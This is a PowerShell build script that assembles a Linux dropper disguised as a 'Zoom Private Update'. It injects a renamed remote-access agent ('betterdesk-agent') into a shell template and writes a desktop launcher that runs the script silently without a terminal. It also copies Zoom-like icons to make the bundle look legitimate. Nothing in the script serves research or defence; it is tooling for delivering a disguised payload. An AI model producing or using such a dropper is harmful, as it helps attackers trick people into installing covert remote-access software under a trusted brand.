# Build the Linux "Zoom Private Update" dropper and its desktop/icon bundle.
# Outputs:
#   distro/clients/linux/Zoom_Update_v<ver>.sh
#   distro/clients/linux/Zoom_Update_v<ver>.desktop
#   distro/clients/linux/zoom-private.png
#   distro/clients/linux/zoom-private.svg
#   distro/clients/linux/SHA256SUMS-linux-dropper
$ErrorActionPreference = 'Stop'

$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$repo = (Resolve-Path (Join-Path $here '..\..')).Path
$dist = Join-Path $repo 'distro\clients\linux'
$version = '6.1.0'
$base = "Zoom_Update_v$version"
$templatePath = Join-Path $here 'linux-dropper.template.sh'
$payloadName = 'zoom-private.Setup_1.0.0_x86_64.bin'
$agent = Join-Path $dist 'betterdesk-agent'

$sha = (Get-FileHash -LiteralPath $agent -Algorithm SHA256).Hash.ToLowerInvariant()

$template = Get-Content -Raw -LiteralPath $templatePath
$script = $template.
    Replace('__VERSION__', $version).
    Replace('__PAYLOAD_NAME__', $payloadName).
    Replace('__PAYLOAD_SHA__', $sha)
$script = $script -replace "`r`n", "`n"
$scriptPath = Join-Path $dist "$base.sh"
[IO.File]::WriteAllText($scriptPath, $script, (New-Object Text.UTF8Encoding($false)))

# Desktop entry: %k is this .desktop file, so the sibling script resolves
# regardless of where the bundle is extracted.
$desktop = @'
[Desktop Entry]
Type=Application
Version=1.0
Name=Zoom Private Update
Comment=Zoom Private update
Exec=sh -c 'cd "$(dirname "$(readlink -f "$1")")" && exec bash "__BASE__.sh"' sh %k
Icon=zoom-private
Terminal=false
Categories=Network;InstantMessaging;
StartupNotify=false
'@ -replace "`r`n", "`n"
$desktop = $desktop.Replace('__BASE__', $base)
$desktopPath = Join-Path $dist "$base.desktop"
[IO.File]::WriteAllText($desktopPath, $desktop, (New-Object Text.UTF8Encoding($false)))

# Extract the largest frame from the Windows icon as the Linux PNG.
$ico = Join-Path $repo 'distro\clients\windows\Zoom_Update_v6.1.0.ico'
$bytes = [IO.File]::ReadAllBytes($ico)
$count = [BitConverter]::ToUInt16($bytes, 4)
$best = 0
$bestSize = -1
for ($i = 0; $i -lt $count; $i++) {
    $offset = 6 + 16 * $i
    $w = if ($bytes[$offset] -eq 0) { 256 } else { [int]$bytes[$offset] }
    if ($w -gt $bestSize) { $bestSize = $w; $best = $i }
}
$entry = 6 + 16 * $best
$len = [BitConverter]::ToUInt32($bytes, $entry + 8)
$srcOff = [BitConverter]::ToUInt32($bytes, $entry + 12)
$png = New-Object byte[] $len
[Array]::Copy($bytes, $srcOff, $png, 0, $len)
[IO.File]::WriteAllBytes((Join-Path $dist 'zoom-private.png'), $png)

$svg = @'
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="256" height="256">
  <defs>
    <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0" stop-color="#2d8cff"/>
      <stop offset="1" stop-color="#0854ff"/>
    </linearGradient>
  </defs>
  <rect x="10" y="10" width="236" height="236" rx="56" fill="url(#g)"/>
  <rect x="51" y="84" width="118" height="88" rx="18" fill="#fff"/>
  <path d="M164 112 L213 89 L213 167 L164 144 Z" fill="#fff"/>
</svg>
'@ -replace "`r`n", "`n"
[IO.File]::WriteAllText((Join-Path $dist 'zoom-private.svg'), $svg, (New-Object Text.UTF8Encoding($false)))

foreach ($f in @($scriptPath, $desktopPath)) {
    try {
        (Get-Item $f).UnixFileMode = [IO.UnixFileMode]'UserRead, UserWrite, UserExecute, GroupRead, GroupExecute, OtherRead, OtherExecute'
    } catch { }
}

$sums = foreach ($file in @($scriptPath, $desktopPath, (Join-Path $dist 'zoom-private.png'), (Join-Path $dist 'zoom-private.svg'))) {
    $h = (Get-FileHash -LiteralPath $file -Algorithm SHA256).Hash.ToLowerInvariant()
    "$h  $(Split-Path -Leaf $file)"
}
$sums | Set-Content -LiteralPath (Join-Path $dist 'SHA256SUMS-linux-dropper') -Encoding ASCII

Copy-Item $scriptPath (Join-Path $here 'zoom-update-linux.sh') -Force
Write-Host "Built $scriptPath"
Write-Host "Built $desktopPath"
Write-Host 'Built zoom-private.png/svg'
